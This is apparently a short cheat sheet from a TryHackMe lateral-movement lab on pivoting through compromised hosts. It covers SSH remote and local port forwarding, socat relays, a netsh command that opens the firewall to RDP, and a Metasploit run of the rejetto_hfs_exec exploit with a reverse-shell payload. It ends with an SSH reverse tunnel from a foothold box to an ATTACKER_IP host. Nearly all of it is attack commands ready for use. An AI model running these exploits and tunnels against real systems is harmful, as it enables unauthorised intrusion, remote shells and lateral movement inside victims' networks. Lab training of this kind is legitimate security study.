# Tunnel with ssh

```
ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N

munra@attacker-pc$ xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPassword
```
# Local Port Forwarding

```
ssh <user>@<target1 ip> -L *:80:127.0.0.1:80 -N
```

# Tunnel to target with socat

```
socat TCP4-LISTEN:1234,fork TCP4:<target2 ip>:4321

# If a firewall is present
netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow protocol=TCP localport=3389
```

# Tunnel from target to local system

```
C:\>socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80
```

# Metasploit exploit with reverse tunnel

```
msf6 > use rejetto_hfs_exec
msf6 exploit(windows/http/rejetto_hfs_exec) > set payload windows/shell_reverse_tcp

msf6 exploit(windows/http/rejetto_hfs_exec) > set lhost thmjmp2.za.tryhackme.com
msf6 exploit(windows/http/rejetto_hfs_exec) > set ReverseListenerBindAddress 127.0.0.1
msf6 exploit(windows/http/rejetto_hfs_exec) > set lport 7878 
msf6 exploit(windows/http/rejetto_hfs_exec) > set srvhost 127.0.0.1
msf6 exploit(windows/http/rejetto_hfs_exec) > set srvport 6666

msf6 exploit(windows/http/rejetto_hfs_exec) > set rhosts 127.0.0.1
msf6 exploit(windows/http/rejetto_hfs_exec) > set rport 8888
msf6 exploit(windows/http/rejetto_hfs_exec) > exploit
```

# Establishing an ssh tunnel from the foothold box

```
ssh tunneluser@ATTACKER_IP -R 8888:<target 2 ip>:80 -L *:6969:127.0.0.1:6969 -L *:9696:127.0.0.1:9696 -N
```

